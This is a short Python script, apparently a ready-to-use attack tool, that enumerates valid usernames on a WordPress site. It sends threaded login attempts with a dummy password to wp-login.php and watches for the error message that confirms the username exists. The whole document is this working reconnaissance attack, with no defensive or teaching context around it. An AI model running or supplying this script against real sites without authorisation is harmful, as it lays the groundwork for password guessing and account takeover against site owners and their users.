import requests
import argparse
import threading

parser = argparse.ArgumentParser("wordpress user enumeration")
parser.add_argument("--url", "-u", help="base url of the wordpress application")
parser.add_argument("--wordlist", "-w", help="username wordlist to enumerate")
parser.add_argument("--threads", "-t", help="number of threads", default='4')

def enumerate(wordlist, url):
    for user in wordlist:
        response = requests.post(url+"/wp-login.php", data=f"log={user}&pwd=xyz", headers={"Content-Type" : "application/x-www-form-urlencoded"}).text
        print(f"trying: {user:<30}", end="\r")
        if "The password you entered for the username" in response:
            print(f"Found valid user: {user}")
        

args = parser.parse_args()
url, wordfile, threads = args.url, args.wordlist, int(args.threads)
wordlist = open(wordfile).read().split()
wordlist = list(set(map(str.lower, wordlist)))
list_size = (len(wordlist)-1)//threads + 1

for i in range(0, len(wordlist), list_size):
    threading.Thread(target=enumerate, args=(wordlist[i:i+list_size+1], url)).start()

